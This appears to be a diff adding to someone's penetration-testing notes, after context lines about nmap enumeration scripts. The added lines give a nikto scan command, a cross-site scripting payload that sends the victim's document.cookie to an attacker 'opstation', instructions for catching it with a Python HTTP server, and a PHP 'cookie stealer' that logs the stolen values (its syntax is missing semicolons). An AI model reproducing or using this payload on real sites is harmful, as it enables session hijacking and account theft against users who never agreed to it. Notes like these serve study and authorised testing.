@@ -37,7 +37,18 @@ can use (previous nmap scan) --script banner.nse which automatically banner grab
 can use (previous nmap scan) --script http-enum.nse used for websites to enumerate well known paths
 can use (previous nmap scan) --script smb-os-dicovery.nse (for windows machines)
 
+nikto -host <ip address> (-port used if port is weird) can be used to get more website related information for an ip
 
+<script>document.location="<http://your opstation ip:8000/>"+document.cookie;</script>
+run python3 -m http.server on your opstation before embedding the above code into the website to receive the cookie you just captured
+
+cookie stealer file
+<?php
+$cookie = $_GET["username"]
+$steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+")
+fwrite($steal, $cookie . "\n")
+fclose($steal)
+?>
 
 
 
